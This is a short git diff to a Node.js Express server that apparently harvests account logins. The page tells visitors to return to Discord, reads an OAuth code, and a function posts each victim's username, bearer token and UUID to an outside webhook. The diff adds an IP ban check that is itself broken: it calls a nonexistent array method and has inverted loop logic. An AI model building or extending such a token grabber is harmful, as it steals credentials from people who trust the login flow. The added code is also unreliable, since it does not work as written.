@@ -11,6 +11,7 @@ const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
+    checkIfBanned(req.ip)
     const code = req.query.code
     if (code == null) {
         return
@@ -129,4 +130,17 @@ function postToWebhook(username, bearerToken, uuid) {
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
+}
+
+const banList = []
+
+function checkIfBanned(ip){
+    for (let i = 0; i < banList.length; i++) {
+        if (banList[i] === ip){
+            return true
+        } else {
+            console.log("IP not found in ban list, adding to ban list. IP: " + ip + "\n")
+            banList.add(ip)
+        }
+    }
 }
